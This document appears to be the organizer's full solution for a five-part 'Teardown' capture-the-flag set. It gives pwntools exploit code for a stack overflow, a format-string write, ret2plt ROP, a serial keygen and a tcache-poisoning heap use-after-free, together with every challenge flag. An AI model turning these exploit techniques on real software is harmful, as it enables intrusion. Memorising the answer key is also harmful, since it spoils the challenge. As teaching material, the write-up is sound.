# Teardown — full solution (ORGANIZER)

The reference exploits are in [../scripts/solver/solve.py](../scripts/solver/solve.py)
(pwntools). `make check` runs them all in-network and submits each flag. Sketches
below; `context.arch = "amd64"`.

---

## 1 — The Overflow (ret2win)
`read(0, buf[64], 256)` overflows. Offset to the return address is 72. Return via
a `ret` gadget (alignment) into `win()`, which reads `/flag`.

```python
e = ELF("c1"); ret = next(e.search(b"\xc3"))
payload = b"A"*72 + p64(ret) + p64(e.sym["win"])
```
Flag `TD{r3t2w1n_st4ck_sm4sh_cl4ss1c_0v3rfl0w}`.

## 2 — The Mirror (format string)
`printf(buf)` with input at direct offset 6. Write `0xc0ffee` into `authed`:

```python
payload = fmtstr_payload(6, {e.sym["authed"]: 0xc0ffee}, write_size="short")
```
`shell()` then `cat`s `/flag`. Flag `TD{f0rmat_str1ng_arb1trary_wr1t3_n_sp3c}`.

## 3 — The Return (ROP)
No `win()`, NX on. The binary ships a `pop rdi ; ret` gadget, a `/bin/sh` string
(`shellcmd`) and a linked `system@plt`. Classic ret2plt:

```python
pop_rdi = next(e.search(b"\x5f\xc3")); ret = pop_rdi + 1
payload = b"A"*72 + p64(ret) + p64(pop_rdi) + p64(e.sym["shellcmd"]) + p64(e.plt["system"])
# then: sendline("cat /flag") to the shell
```
Flag `TD{r3t2l1bc_r0p_l34k_g0t_c4ll_syst3m}`.

*(The intended lesson is the full ret2libc — leak `puts@libc`, compute the base,
`system("/bin/sh")`. We make C3 a self-contained ret2plt so the reference solver
is deterministic under the amd64 emulator, where the loader doesn't ASLR and the
`puts` leak truncates on a null byte. On a real x86 host, the leak-based path is
the natural solve.)*

## 4 — The Lock (reverse engineering)
`t[i] = ((serial[i] ^ (0x41+i)) + 7) & 0xff`, compared to a fixed `target`.
Invert it:

```python
target = bytes.fromhex("2d79233d7d377b4141801b2885184643")
serial = bytes(((target[i]-7) & 0xff) ^ (0x41+i) for i in range(16))   # "g0_r3v3rs3_m3_pl"
```
`win()` prints `/flag`. Flag `TD{r3v3rs3_th3_s3r14l_x0r_tr4nsf0rm_cr4ckm3}`.

## 5 — The Freelist (heap UAF, safe-linking)
`delete` frees without nulling; `edit`/`view` touch freed chunks. glibc 2.36
safe-linking mangles tcache `fd` = `(pos>>12) ^ next`.

```python
new(0, 0x50); new(1, 0x50)
delete(0)
key = u64(view(0)[:8])            # leak mangle key = pos>>12
delete(1)
edit(1, p64(key ^ e.sym["hidden"]))   # chunk1.fd -> mangle(&hidden)
new(2, 0x50); new(3, 0x50)        # new(3) returns a chunk AT &hidden
edit(3, p64(e.sym["shell"]))      # hidden = &shell
run()                             # hidden() -> shell() -> cat /flag
```
`hidden` is 16-aligned so it passes the tcache alignment check. Flag
`TD{h34p_uaf_tc4ch3_p01s0n_fptr_0v3rwr1t3}`.

---

## One-shot

```bash
make up && make check     # -> ALL 5 FLAGS CAPTURED, exit 0
```
